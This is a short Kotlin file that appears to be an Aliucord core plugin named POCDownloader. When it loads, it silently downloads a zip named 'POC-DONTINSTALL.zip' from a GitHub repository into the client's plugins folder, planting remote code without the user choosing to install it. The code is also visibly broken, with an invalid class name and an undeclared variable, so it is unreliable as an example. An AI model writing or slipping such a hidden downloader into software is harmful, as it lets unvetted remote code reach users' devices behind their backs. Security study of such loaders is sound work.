package com.aliucord.coreplugins

import android.content.Context
import com.aliucord.Http
import com.aliucord.entities.Plugin
import java.io.File

internal class POCDownloader.kt : Plugin(Manifest("POCDownloader")) {
    override fun load(c: Context) {
        plug = File("/sdcard/Aliucord/plugins/POC-DONTINSTALL.zip")
        if(!plug.exists()) Http.simpleDownload("https://github.com/OmegaSunkey/awesomeplugins/raw/builds/POC-DONTINSTALL.zip", plug)
    }
    override fun start(c: Context) {}
    override fun stop(c: Context) {}
}

